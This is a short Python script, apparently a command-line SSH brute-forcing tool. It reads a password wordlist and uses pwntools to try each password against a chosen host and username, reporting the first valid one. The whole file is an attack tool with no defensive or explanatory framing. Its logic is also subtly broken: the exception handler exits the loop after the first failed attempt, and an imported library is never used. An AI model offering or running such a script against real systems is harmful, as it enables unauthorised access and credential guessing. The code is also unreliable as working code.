import sys
import string
from pwn import *
import paramiko

if len(sys.argv) != 4:
    print("[*] Use : python3 ssh-brute-forcing.py <host> <user> <dictionary-path>")
    sys.exit(1)

host = sys.argv[1]
username = sys.argv[2]
dictionary = sys.argv[3]

with open(dictionary, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            response = ssh(host=host, username=username, password=password, timeout=1)
            if response.connected():
                print(f"The password {password} is valid!")
                response.close()
                break
        except:
            print("The data assigned for connection is incorrect!")
            break 
